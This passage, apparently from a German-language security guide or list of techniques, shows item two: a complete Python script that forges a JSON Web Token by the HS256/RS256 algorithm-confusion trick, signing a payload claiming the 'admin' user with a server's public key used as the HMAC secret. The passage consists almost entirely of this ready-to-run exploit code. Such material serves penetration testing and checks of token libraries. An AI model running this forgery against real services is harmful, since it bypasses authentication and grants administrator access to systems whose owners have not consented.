```

2. HS256/RS256 Algorithm-Confusion (Public Key als HMAC-Secret):
```python
import hmac, hashlib, base64, json

def b64u(data):
    if isinstance(data, dict): data = json.dumps(data, separators=(',',':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

with open('public_key.pem', 'rb') as f:
    pubkey = f.read()

header  = {"alg": "HS256", "typ": "JWT"}
payload = {"user": "admin", "iat": 1700000000}
msg     = f"{b64u(header)}.{b64u(payload)}".encode()
sig     = hmac.new(pubkey, msg, hashlib.sha256).digest()
token   = f"{msg.decode()}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
print(token)
```

